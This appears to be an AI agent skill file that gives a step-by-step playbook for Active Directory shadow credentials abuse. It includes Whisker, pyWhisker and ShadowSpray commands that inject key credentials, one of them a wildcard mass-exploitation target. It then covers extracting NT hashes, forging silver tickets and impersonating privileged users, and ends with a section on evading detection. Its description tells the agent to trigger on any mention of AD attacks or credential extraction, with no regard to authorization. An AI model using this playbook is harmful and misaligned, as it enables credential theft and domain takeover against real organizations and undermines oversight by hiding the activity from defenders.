---
name: shadow-credentials-abuse
description: How to abuse Active Directory Key Trust and msDS-KeyCredentialLink to extract NT hashes and create silver tickets. Use this skill whenever the user mentions Active Directory attacks, msDS-KeyCredentialLink, Key Trust abuse, NT hash extraction, TGT manipulation, shadow credentials, or any scenario involving Windows Server 2016+ domain environments with write permissions to user/computer objects. Trigger even if they don't explicitly name the technique but describe having write access to AD objects and wanting to extract credentials.
---

# Shadow Credentials Abuse

This skill guides you through abusing the **msDS-KeyCredentialLink** attribute in Active Directory to extract NT hashes and create silver tickets via Key Trust authentication.

## When to Use This Technique

Use Shadow Credentials abuse when:
- You have write permissions to `msDS-KeyCredentialLink` on a user or computer object
- The domain is Windows Server 2016+ functional level
- You need to extract an NT hash without creating new accounts
- You want to avoid delegation to vulnerable accounts
- You're in a Windows Server 2016+ environment with certificate-based authentication

## Requirements Checklist

Before attempting this attack, verify:

- [ ] At least one Windows Server 2016 Domain Controller
- [ ] Domain Controller has server authentication digital certificate installed
- [ ] Active Directory at Windows Server 2016 Functional Level or higher
- [ ] Account with delegated rights to modify `msDS-KeyCredentialLink` on target object

## Attack Methodology

### Step 1: Verify Prerequisites

Check the domain functional level and certificate requirements:

```powershell
# Check domain functional level
Get-ADDomain | Select-Object DomainMode

# Verify DC has certificate
Get-ADComputer <DC-Name> | Select-Object -ExpandProperty msDS-KeyCredentialLink
```

### Step 2: Add Key Credential

Use one of the available tools to inject a key credential into the target object.

#### Using Whisker (C#)

```shell
Whisker.exe add /target:<computername$> /domain:<domain.local> /dc:<dc1.domain.local> /path:C:\path\to\file.pfx /password:P@ssword1
```

**Whisker operations:**
- `add` - Generate key pair and add credential
- `list` - Display all key credential entries
- `remove` - Delete specified key credential
- `clear` - Erase all key credentials (use carefully)

#### Using pyWhisker (Python/Unix)

```shell
python3 pywhisker.py -d "domain.local" -u "attacker" -p "password" --target "victim" --action "add"
python3 pyWhisker.py -d "domain.local" -u "attacker" -p "password" --target "victim" --action "list"
python3 pyWhisker.py -d "domain.local" -u "attacker" -p "password" --target "victim" --action "remove"
```

#### Using ShadowSpray (Mass Exploitation)

For exploiting GenericWrite/GenericAll permissions across multiple objects:

```shell
python3 ShadowSpray.py -d "domain.local" -u "attacker" -p "password" --target "*" --action "add"
```

### Step 3: Extract NT Hash

Once the key credential is added, request a TGT which will contain the encrypted NTLM_SUPPLEMENTAL_CREDENTIAL in the PAC. Decrypt to obtain the NT hash.

### Step 4: Post-Exploitation Options

With the NT hash, you can:

1. **Create RC4 Silver Tickets** - Act as privileged users on target hosts
2. **Use TGT with S4U2Self** - Impersonate privileged users (requires modifying Service Ticket to add service class)

## Advantages of This Technique

- Limited to attacker-generated private key (no delegation to vulnerable accounts)
- No need to create computer accounts (which can be difficult to remove)
- Works with existing write permissions on AD objects
- Leaves minimal forensic artifacts compared to other techniques

## Cleanup

After testing or exploitation, remove injected credentials:

```shell
# Whisker
Whisker.exe remove /target:<computername$> /domain:<domain.local> /dc:<dc1.domain.local> /keyid:<key-id>

# pyWhisker
python3 pywhisker.py -d "domain.local" -u "attacker" -p "password" --target "victim" --action "remove" --keyid <key-id>
```

## Detection Evasion

- Use legitimate-looking key IDs
- Time operations during normal business hours
- Remove credentials after use
- Monitor for unusual `msDS-KeyCredentialLink` modifications in AD audit logs

## References

- [SpecterOps: Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Whisker (GitHub)](https://github.com/eladshamir/Whisker)
- [pyWhisker (GitHub)](https://github.com/ShutdownRepo/pywhisker)
- [ShadowSpray (GitHub)](https://github.com/Dec0ne/ShadowSpray/)

## Common Issues

| Issue | Solution |
|-------|----------|
| "msDS-KeyCredentialLink not found" | Verify domain functional level is 2016+ |
| "Access denied" | Check write permissions on target object |
| "Certificate not found" | Ensure DC has server authentication certificate |
| "Key credential already exists" | Use `list` to see existing keys, then `remove` or use different key ID |
